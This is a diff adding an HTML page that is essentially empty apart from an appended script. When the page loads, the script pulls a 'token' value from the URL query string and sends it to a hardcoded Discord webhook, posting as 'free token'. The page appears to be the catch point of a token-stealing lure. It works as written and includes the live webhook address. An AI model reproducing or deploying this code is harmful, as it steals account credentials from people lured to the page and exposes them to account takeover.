@@ -1,0 +1,29 @@
+<html>
+  <head>
+    h
+  </head>
+  <body>
+    
+  </body>
+</html>
+
+<script>
+
+url__ = document.URL
+url_ = url__.split("?").pop()
+token = url_.split("=").pop()
+
+const request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/1165250104685514852/gVNuTur5zwckLPeQMQTwUPN6lCfuK7hLSyfPORnHU5qp0CnFc3Qe7dzKNOGH8_JnoJmR");
+
+request.setRequestHeader('Content-type', 'application/json');
+
+const params = {
+    username: "free token",
+    avatar_url: "",
+    content: token
+}
+
+request.send(JSON.stringify(params));
+  
+</script>
